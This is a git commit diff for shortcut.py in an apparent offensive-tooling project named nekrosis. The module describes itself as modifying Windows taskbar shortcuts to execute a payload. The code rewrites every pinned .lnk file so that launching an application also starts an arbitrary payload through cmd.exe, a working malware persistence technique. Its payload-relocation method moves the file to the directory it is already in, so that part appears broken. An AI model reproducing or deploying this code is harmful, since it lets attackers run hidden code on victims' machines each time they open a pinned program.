950942e26892c13a8922cdd957ee98da2d75527a
Mykola Grymalyuk <khronokernel@icloud.com>
2024-02-24 15:32:52 -0700

    shortcut.py: Add docstrings and logging usage

--- nekrosis/support/windows_utilities/shortcut.py
+++ nekrosis/support/windows_utilities/shortcut.py
@@ -1,43 +1,67 @@
+"""
+shortcut.py: Modify Windows taskbar shortcuts to execute a payload.
+"""
+
 import os
 import sys
+import logging
+
+from pathlib import Path
 
 if sys.platform == "win32":
     import win32com.client
 else:
     win32com = None
 
+
 class TaskbarShortcut:
-    
+
     def __init__(self, payload: str) -> None:
         self.payload = payload
-        
-    def modify_shortcuts(self):
-        current_user = os.getlogin()
-        shortcut_folder = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar".format(current_user)
-        
-        for shortcut_file in os.listdir(shortcut_folder):
-            shortcut_path = os.path.join(shortcut_folder, shortcut_file)
-            if shortcut_file.endswith('.lnk'):
-                self.modify_shortcut(shortcut_path)
+        self._user_shortcut_folder = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar"
 
-    def modify_shortcut(self, shortcut_path):
+
+    def _relocate_payload(self) -> None:
+        """
+        Relocate payload to Shortcuts folder's parent directory.
+        """
+        payload_path = Path(self.payload)
+        new_payload_path = payload_path.parent / payload_path.name
+        payload_path.replace(new_payload_path)
+
+        self.payload = str(new_payload_path)
+
+
+    def _modify_shortcut(self, shortcut_path: str) -> None:
+        """
+        Modify a shortcut.
+        """
+
         shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortCut(shortcut_path)
-        
-        original_target_path = shortcut.TargetPath
-        PersisPayload = self.payload
-        
-        arguments = rf'C:\Windows\System32\cmd.exe /c "start "" "{original_target_path}" & start "" "{PersisPayload}""'
-        shortcut.Arguments = arguments
-        shortcut.TargetPath = r'C:\Windows\System32\cmd.exe'  
-        shortcut.Save()
-        print(f"Shortcut Modified: {shortcut_path}")
-        print(arguments)
 
-    def install(self):
-        self.modify_shortcuts()
-        
-if __name__ == "__main__":
-    payload = r"C:\Users\UlyssesHill\Downloads\payload.exe"  # Replace this with the path to your payload
-    taskbar_shortcut = TaskbarShortcut(payload)
-    taskbar_shortcut.install()
+        original_target_path = shortcut.TargetPath
+
+        arguments = rf'C:\Windows\System32\cmd.exe /c "start "" "{original_target_path}" & start "" "{self.payload}""'
+        shortcut.Arguments = arguments
+        shortcut.TargetPath = "C:\\Windows\\System32\\cmd.exe"
+        shortcut.Save()
+
+        logging.info(f"Shortcut Modified: {shortcut_path}")
+
+
+    def _modify_shortcuts(self) -> None:
+        """
+        Modify all taskbar shortcuts.
+        """
+        for shortcut_file in os.listdir(self._user_shortcut_folder):
+            shortcut_path = os.path.join(self._user_shortcut_folder, shortcut_file)
+            if shortcut_file.endswith('.lnk'):
+                self._modify_shortcut(shortcut_path)
+
+
+    def install(self) -> None:
+        """
+        Modify taskbar shortcuts to execute the payload.
+        """
+        self._modify_shortcuts()
